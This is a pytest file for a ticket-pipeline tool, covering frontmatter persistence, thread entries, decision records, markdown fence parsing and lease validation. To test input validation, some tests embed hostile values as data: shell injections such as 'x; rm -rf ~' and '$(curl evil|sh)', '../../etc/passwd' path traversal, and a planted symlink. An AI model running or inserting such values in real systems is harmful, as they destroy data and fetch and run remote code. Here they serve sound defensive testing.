"""The ticket file: what survives a save, what is refused, and the thread."""
import argparse
import shutil
import tempfile
from pathlib import Path

from helpers import FIXTURE, project
from pipeline.cli.main import cmd_approve
from pipeline.core import PipelineError
from pipeline.core import ticket as T
from pipeline.core.gate import gate
from pipeline.core.ticket import Ticket
from pipeline.daemon import supervisor


def test_unknown_frontmatter_survives_a_save():
    """The trap a typed model walks into: a field nobody modelled is data loss."""
    d = project(FIXTURE.replace("counters: {}", "approved_by: chezzijr\ncounters: {}"))
    p = d / ".project/tickets/TICKET-001.md"
    t = Ticket.load(p)
    assert t.extra["approved_by"] == "chezzijr"
    assert t.klass == "bugfix" and t.section("Digest").startswith("- thing.py holds it")
    t.save()
    assert Ticket.load(p).extra["approved_by"] == "chezzijr"
    assert "class: bugfix" in p.read_text(), "the YAML key is `class`, not `klass`"
    shutil.rmtree(d)


def test_save_refuses_an_invalid_ticket():
    """Invariant 5 on the WRITE side: a hostile branch must never reach disk."""
    d = project()
    p = d / ".project/tickets/TICKET-001.md"
    t = Ticket.load(p)
    before = p.read_text()
    t.branch = "x; rm -rf ~"
    try:
        t.save()
        assert False, "wrote a hostile branch to disk"
    except PipelineError:
        pass
    assert p.read_text() == before, "a refused save still touched the file"
    shutil.rmtree(d)


def test_thread_entries_round_trip_and_freeform_survives():
    d = project()
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.append("review", "finding", "evict drops the wrong key", severity="blocking")
    e = t.thread()[-1]
    assert (e.stage, e.kind, e.attrs["severity"]) == ("review", "finding", "blocking")
    assert "evict drops the wrong key" in e.text
    t.save()
    assert Ticket.load(t.path).thread()[-1].attrs["severity"] == "blocking"

    t.body += "\n### notes from a human\nlooks fine\n"
    last = t.thread()[-1]           # must not raise: hand-editing is the point
    assert last.kind == "note" and last.ts is None and last.stage == ""
    shutil.rmtree(d)


def test_an_invented_thread_kind_is_refused_on_the_way_in():
    d = project()
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    try:
        t.append("review", "lgtm", "x")
        assert False, "wrote a kind no reader knows"
    except PipelineError:
        pass
    shutil.rmtree(d)


def test_frontmatter_that_reaches_a_shell_is_validated():
    ok = {"id": "TICKET-001", "branch": "ticket/001",
          "test_file": "tests/t.py::test_x", "files_declared": ["src/a.py"]}
    assert T.validate_meta(ok) == []
    for field, value in [
        ("test_file", "t.py::x; touch /tmp/PWNED"),
        ("branch", "x; rm -rf ~"),
        ("id", "$(curl evil|sh)"),
        ("id", "../../etc/passwd"),
        ("id", "/tmp/elsewhere"),
        ("stage", "done-ish"),
    ]:
        assert T.validate_meta({**ok, field: value}), f"{field}={value!r} accepted"
    assert T.validate_meta({**ok, "files_declared": ["../../etc/passwd"]})
    assert T.validate_meta({**ok, "files_declared": ["/etc/passwd"]})


def test_a_result_verdict_survives_a_crash_before_it_is_applied():
    d = project()
    T.result_file(d, "TICKET-001").write_text("result: ok\nsummary: x\n")
    assert T.read_result(d, "TICKET-001", keep=True) == {"result": "ok", "summary": "x"}
    assert T.result_file(d, "TICKET-001").is_file(), \
        "the verdict must stay on disk until it has been acted on"
    T.drop_result(d, "TICKET-001")
    assert T.read_result(d, "TICKET-001") is None
    shutil.rmtree(d)


def test_a_corrupt_result_file_does_not_crash_the_dispatcher():
    d = project()
    T.result_file(d, "TICKET-001").write_text("{[not: valid: yaml")
    assert T.read_result(d, "TICKET-001") == {}
    T.result_file(d, "TICKET-001").write_text("- a list, not a mapping")
    assert T.read_result(d, "TICKET-001") == {}
    shutil.rmtree(d)


def test_a_colon_in_the_summary_does_not_destroy_the_verdict():
    """What a stage reports is error text, and error text has colons in it.
    `summary: fails with "... the pty: b'\\r'"` is a YAML ScannerError, and the
    whole verdict used to become `{}` -- which reads as `fail`. TICKET-021
    escalated twice in ten minutes that way, each time with a correct
    `result: ok`, a committed test, and an empty reason in the thread."""
    d = project()
    T.result_file(d, "TICKET-001").write_text(
        "result: ok\n"
        "summary: reproduced; fails with \"raw mode never reached the pty: b'\\r'\"\n"
        "files_declared:\n- pipeline/tui/app.py\n- tests/test_tui.py\n"
        "test_file: tests/test_tui.py::test_raw_mode\n")
    got = T.read_result(d, "TICKET-001")
    assert got["result"] == "ok", f"a colon lost the verdict: {got}"
    assert got["files_declared"] == ["pipeline/tui/app.py", "tests/test_tui.py"]
    assert got["test_file"] == "tests/test_tui.py::test_raw_mode"
    assert got["summary"].endswith('b\'\\r\'"'), \
        f"the summary was truncated at the colon: {got['summary']!r}"
    shutil.rmtree(d)


def test_decision_is_recorded_when_a_ticket_lands():
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nkeep the explicit flush; without it the buffer leaks\n"
        "## Rollback\nrevert"))
    path = d / ".project/tickets/TICKET-001.md"
    did = T.record_decision(d, Ticket.load(path))
    text = (d / ".project/decisions" / f"{did}.md").read_text()
    assert "buffer leaks" in text and "TICKET-001" in text, text
    shutil.rmtree(d)


def test_no_decisions_section_records_nothing():
    d = project()
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    assert T.record_decision(d, t) is None
    shutil.rmtree(d)


def test_a_decision_can_supersede_an_earlier_one():
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nsupersedes: DEC-003 -- the flush moved into the writer, "
        "so the explicit call is dead\n"
        "## Rollback\nrevert"))
    dec = d / ".project" / "decisions"
    dec.mkdir(parents=True, exist_ok=True)
    (dec / "DEC-003.md").write_text(
        "# DEC-003\n\n- ticket: TICKET-003 (bugfix)\n- branch: ticket/003\n"
        "- files: writer.py\n- decided: 2026-01-01\n\n"
        "keep the explicit flush; without it the buffer leaks\n")

    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.id = "TICKET-011"
    did = T.record_decision(d, t)
    assert did == "DEC-011"
    assert "superseded-by: DEC-011" in (dec / "DEC-003.md").read_text()
    assert "supersedes: DEC-003" in (dec / "DEC-011.md").read_text()
    assert "DEC-003" not in [dd.id for dd in T.active_decisions(d)]
    assert "DEC-011" in [dd.id for dd in T.active_decisions(d)]
    shutil.rmtree(d)


def test_supersedes_naming_a_bad_or_missing_record_is_a_finding_not_a_crash():
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nsupersedes: ../../etc/passwd -- pwn\n"
        "## Rollback\nrevert"))
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.id = "TICKET-012"
    did = T.record_decision(d, t)
    assert did == "DEC-012"
    dec = d / ".project" / "decisions"
    written = list(dec.glob("*"))
    assert all(p.name == f"{did}.md" for p in written), written
    assert not (d / "etc").exists()
    finding = next(e for e in t.thread() if e.kind == "finding")
    assert "'../../etc/passwd'" in finding.text, finding.text

    d2 = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nsupersedes: DEC-999 -- ghost\n"
        "## Rollback\nrevert"))
    t2 = Ticket.load(d2 / ".project/tickets/TICKET-001.md")
    t2.id = "TICKET-013"
    did2 = T.record_decision(d2, t2)
    assert did2 == "DEC-013"
    assert "DEC-999" not in [dd.id for dd in T.active_decisions(d2)]
    finding2 = next(e for e in t2.thread() if e.kind == "finding")
    assert "'DEC-999'" in finding2.text, finding2.text
    shutil.rmtree(d)
    shutil.rmtree(d2)


def test_active_decisions_ignores_a_coincidental_superseded_by_line_in_body_text():
    """A decision's own prose is agent-written too -- a loose text scan for
    `superseded-by:` anywhere in the file would drop a brand-new, still-active
    record just because its body happens to mention the phrase."""
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nwe considered - superseded-by: DEC-999 (rejected) as an "
        "approach but kept the original design\n"
        "## Rollback\nrevert"))
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.id = "TICKET-014"
    did = T.record_decision(d, t)
    assert did == "DEC-014"
    assert "DEC-014" in [dd.id for dd in T.active_decisions(d)]
    shutil.rmtree(d)


def test_record_decision_refuses_to_follow_a_planted_symlink():
    """`SAFE_DEC_ID` only constrains the name; a symlink planted at that exact
    path must still be refused rather than followed."""
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nsupersedes: DEC-999 -- pwn\n"
        "## Rollback\nrevert"))
    dec = d / ".project" / "decisions"
    dec.mkdir(parents=True, exist_ok=True)
    secret = d / "secret.txt"
    secret.write_text("outside decisions/\n")
    (dec / "DEC-999.md").symlink_to(secret)

    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.id = "TICKET-015"
    did = T.record_decision(d, t)
    assert did == "DEC-015"
    assert secret.read_text() == "outside decisions/\n", "wrote through the symlink"
    assert "DEC-999" not in [dd.id for dd in T.active_decisions(d)]
    shutil.rmtree(d)


def test_record_decision_is_idempotent_under_a_crash_recovery_replay():
    """The dispatcher's lease-expiry recovery can respawn a stage and replay
    the same transition; record_decision() must not double-append."""
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nsupersedes: DEC-003 -- reason\n"
        "## Rollback\nrevert"))
    dec = d / ".project" / "decisions"
    dec.mkdir(parents=True, exist_ok=True)
    (dec / "DEC-003.md").write_text("# DEC-003\n\nkeep it\n")

    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.id = "TICKET-016"
    T.record_decision(d, t)
    T.record_decision(d, t)  # a replayed respawn calling this a second time
    text = (dec / "DEC-003.md").read_text()
    assert text.count("superseded-by: DEC-016") == 1, text
    shutil.rmtree(d)


def test_there_is_only_one_writer_path():
    """Two writers meant validation-on-save was dead code. It is gone."""
    for name in ("load_ticket", "save_ticket", "append_thread"):
        assert not hasattr(T, name), f"`{name}` is a second, unvalidated writer path"


def test_an_entry_lands_inside_the_thread_not_at_the_end_of_the_file():
    """`## Thread` is last in today's template by luck, not by contract."""
    d = project(FIXTURE + "\n## Notes\nhand-written, keep me\n")
    p = d / ".project/tickets/TICKET-001.md"
    t = Ticket.load(p)
    t.append("review", "finding", "belongs in the thread", severity="minor")
    t.save()

    t = Ticket.load(p)
    assert "belongs in the thread" in t.section("Thread")
    assert t.section("Notes") == "hand-written, keep me", t.section("Notes")
    assert len(t.thread()) == 1 and t.thread()[0].kind == "finding"
    shutil.rmtree(d)


def test_the_dispatcher_writes_typed_thread_entries():
    """Every entry the dispatcher writes used to read back `note` / `""`, so a
    later stage had nothing typed to receive."""
    d = project()
    p = d / ".project/tickets/TICKET-001.md"

    assert gate(d, "TICKET-001")[0]
    supervisor.advance(d, Ticket.load(p), "ok", "gate passed")
    cmd_approve(argparse.Namespace(project=str(d), id="TICKET-001", by="chezzijr"))
    supervisor.escalate(Ticket.load(p), "a human is needed")

    entries = Ticket.load(p).thread()
    kinds = {(e.stage, e.kind) for e in entries}
    assert ("plan-validation", "gate") in kinds, kinds
    assert ("plan-validation", "transition") in kinds, kinds
    assert ("human", "approval") in kinds, kinds
    assert ("revalidating", "escalation") in kinds, kinds  # approval lands here now
    assert all(e.stage and e.kind != "note" for e in entries), \
        "a dispatcher write came back freeform"
    assert next(e for e in entries if e.kind == "gate").attrs["verdict"] == "PASS"
    shutil.rmtree(d)


def test_a_heading_inside_a_fenced_block_is_not_a_section():
    """The gate and `verifying` embed raw test output inside ``` fences. A
    `## ` line in that output must not open a section: it truncates the thread
    and every later entry becomes unreachable to a stage reading it as data."""
    thread = ("\n### entry one\n\n"
              "```\n## Acceptance criteria\ncaptured output, not a heading\n```\n"
              "\n### entry two\n\nmust stay reachable\n")
    s = T.sections("## Summary\nx\n## Thread\n" + thread)
    assert "Acceptance criteria" not in s, "a fenced `## ` line opened a section"
    assert "must stay reachable" in s["Thread"], "the thread was truncated"

    d = project(FIXTURE + thread)
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    assert len(t.thread()) == 2, [e.text for e in t.thread()]
    shutil.rmtree(d)


def test_append_entry_is_not_fooled_by_a_fenced_heading():
    """`append_entry` finds the end of `## Thread` the same way `sections()`
    finds its start -- a fenced `## ` line in the last entry must not look
    like the section boundary, or the new entry lands inside the fence."""
    body = ("## Summary\nx\n\n## Thread\n\n### entry one\n\n"
            "```\n## fake heading\ncaptured\n```\n")
    out = T.append_entry(body, "2026-01-01 · planning · note", "landed")
    assert set(T.sections(out)) == {"Summary", "Thread"}
    thread = T.sections(out)["Thread"]
    assert "captured" in thread, "the fenced text was lost"
    assert "landed" in thread, "the new entry did not land in Thread"
    entries = Ticket(path=Path("x"), id="TICKET-001", body=out).thread()
    assert len(entries) == 2, "the new entry landed inside the fence, not after it"

    out2 = T.append_entry(body + "\n## After\ntail\n", "2026-01-01 · planning · note", "landed")
    assert T.sections(out2)["After"] == "tail", "a real section after Thread must still bound it"
    assert "landed" in T.sections(out2)["Thread"]


def test_a_thread_entry_is_not_split_by_a_fenced_heading():
    """`Ticket.thread()` splits entries on `### `, the same fence-blind bug
    one level down -- a fenced `### ` line inside an entry must not start a
    phantom second entry."""
    thread = "\n### entry one\n\n```\n### captured\nfake\n```\n"
    d = project(FIXTURE + thread)
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    entries = t.thread()
    assert len(entries) == 1, [e.text for e in entries]
    assert "captured" in entries[0].text
    shutil.rmtree(d)


def test_a_fence_closes_only_on_its_own_terms():
    """The closing rule is CommonMark's, not toggle-on-every-fence: same
    character, at least as long as the opener, no info string."""
    tilde = "## Summary\nx\n## Thread\n~~~\n## fake\n~~~\n"
    assert "fake" not in T.sections(tilde)

    nested = ("## Summary\nx\n## Thread\n````\n```\n## fake heading\n```\n"
              "still fenced\n````\n## After\ntail\n")
    s = T.sections(nested)
    assert "fake heading" not in s, "a shorter inner fence closed the outer one"
    assert s["After"] == "tail"

    info_string = ("## Summary\nx\n## Thread\n```\n## still fenced\n```py\n"
                   "end now\n```\n## After\ntail\n")
    s = T.sections(info_string)
    assert "still fenced" not in s, "a closing candidate with an info string closed the fence"
    assert s["After"] == "tail"


def test_a_lease_nobody_can_read_escalates_instead_of_crashing():
    """`lease.expires` is the field `validate_meta` never checked. Unquoted,
    YAML hands back a `datetime` and `fromisoformat` raised TypeError; a naive
    ISO string raised on the comparison instead. Neither is caught anywhere:
    `ls` died for every project, and the tick aborted that project's whole
    pass, every tick, forever."""
    from datetime import datetime, timedelta, timezone
    ok = {"id": "TICKET-001", "branch": "ticket/001"}
    assert T.validate_meta({**ok, "lease": {"holder": None, "expires": None}}) == []

    for value in (datetime(2026, 8, 21, 10), "2026-08-21 10:00:00",
                  "2026-08-21T10:00:00+00:00"):
        # readable: a shape a human plausibly typed, and it must still answer
        t = Ticket(path=None, id="TICKET-001", branch="ticket/001",
                   lease={"holder": "x", "expires": value})
        assert t.errors() == [], (value, t.errors())
        assert isinstance(t.lease_active(), bool), value

    for value in ("whenever", 17, [], "2026-13-45"):
        t = Ticket(path=None, id="TICKET-001", branch="ticket/001",
                   lease={"holder": "x", "expires": value})
        assert t.errors(), f"{value!r} accepted as a lease expiry"
        assert t.lease_active() is False, value
    assert T.validate_meta({**ok, "lease": "held"}), "a non-mapping lease accepted"

    # and the two readable shapes still mean what they say
    soon = (T.now() + timedelta(minutes=5)).replace(tzinfo=None)
    assert Ticket(path=None, id="TICKET-001", branch="ticket/001",
                  lease={"holder": "x", "expires": soon.isoformat()}).lease_active()
    assert not Ticket(path=None, id="TICKET-001", branch="ticket/001",
                      lease={"holder": "x",
                             "expires": datetime(2000, 1, 1, tzinfo=timezone.utc)}
                      ).lease_active()


def test_one_hand_edited_lease_does_not_blank_the_listing_for_every_project():
    """`ticket_rows` runs before anything has validated anything -- `_op_ls`
    answers for every registered project from it, and `cmd_ls` falls back to
    it. One unreadable ticket must cost that ticket's row, not the listing."""
    from pipeline.core.config import harness
    from pipeline.daemon.server import ticket_rows
    # unquoted: YAML hands back a datetime, not a str
    d = project(FIXTURE.replace("lease: {holder: null, expires: null}",
                                "lease: {holder: x, expires: 2026-08-21 10:00:00}"))
    (d / ".project/tickets/TICKET-002.md").write_text(
        FIXTURE.replace("id: TICKET-001", "id: TICKET-002"))
    (d / ".project/tickets/TICKET-003.md").write_text(
        FIXTURE.replace("id: TICKET-001", "id: TICKET-003")
               .replace("lease: {holder: null, expires: null}",
                        "lease: {holder: x, expires: whenever}"))

    rows = {r["id"]: r for r in ticket_rows(d)}
    assert set(rows) == {"TICKET-001", "TICKET-002", "TICKET-003"}, rows
    assert rows["TICKET-002"]["stage"] == "plan-validation", rows

    # and a lease nobody can read escalates the one ticket carrying it
    supervisor.start(d, d / ".project/tickets/TICKET-003.md", harness("fake"), {})
    assert Ticket.load(d / ".project/tickets/TICKET-003.md").stage == "escalated"
    shutil.rmtree(d, ignore_errors=True)


def test_project_paths_accept_a_string():
    """The CLI, the daemon registry and the socket protocol all carry a
    project as a string. `"/tmp/x" / ".project"` raises a TypeError naming
    neither the argument nor the function, so the caller has to read the
    traceback to learn it wanted a Path."""
    d = tempfile.mkdtemp()
    assert T.tickets_dir(d) == T.tickets_dir(Path(d))
    assert T.ticket_path(d, "TICKET-001").name == "TICKET-001.md"
    assert T.all_tickets(d) == []
    shutil.rmtree(d, ignore_errors=True)


def test_the_stage_view_is_bounded_by_thread_length():
    """The symptom of TICKET-023: what a stage is asked to read grows with the
    thread. A stage is handed a view, and its size must not depend on how many
    stages ran before it -- while `## Summary`, `## Digest` and `## Plan`, the
    parts a later stage acts on, stay in it."""
    d = project()
    p = d / ".project/tickets/TICKET-001.md"
    t = Ticket.load(p)
    for i in range(5):
        t.append("implementing", "note", f"early entry {i} " + "x" * 400)
    small = T.stage_view(t, "implementing")
    for i in range(200):
        t.append("implementing", "note", f"late entry {i} " + "x" * 400)
    big = T.stage_view(t, "implementing")

    assert len(big) < 2 * len(small) + 4000, (
        f"the view grew with the thread: {len(small)} -> {len(big)} chars")
    for name in ("Summary", "Digest", "Plan"):
        assert T.sections(t.body)[name] in big, f"the view dropped `## {name}`"
    shutil.rmtree(d)
